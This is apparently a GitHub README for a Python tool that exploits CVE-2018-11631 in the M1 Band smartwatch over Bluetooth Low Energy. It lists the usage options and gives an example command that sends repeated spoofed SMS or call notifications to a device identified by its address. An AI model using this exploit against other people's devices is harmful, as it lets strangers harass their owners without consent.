# Band Exploit (CVE-2018-11631)

A Simple Python script Using Gatttool to exploit an Insecure Bluetooth Low Energy Smart Watch ( M1 Band 1).

 CVE-2018-11631 : https://nvd.nist.gov/vuln/detail/CVE-2018-11631

![alt BandExploit](https://github.com/xMagass/bandexploit/raw/master/bandexploit.png)

Usage: bandexploit.py [options] Address 

Options:

  -h, --help            show this help message and exit
  
  -s, --sms             Send SMS Notification to the device
  
  -c, --call            Send CALL Notification to the device
  
  -r REPEAT, --repeat=REPEAT Number of repetitions
                        
  -m MESSAGE, --message=MESSAGE  Notification message to send. Max_LEN = 8


Example: Sending 15 Call notifications with message xMagass

      ./bandexploit.py 78:02:b7:21:1d:fc -r 15 -m xMagass -c
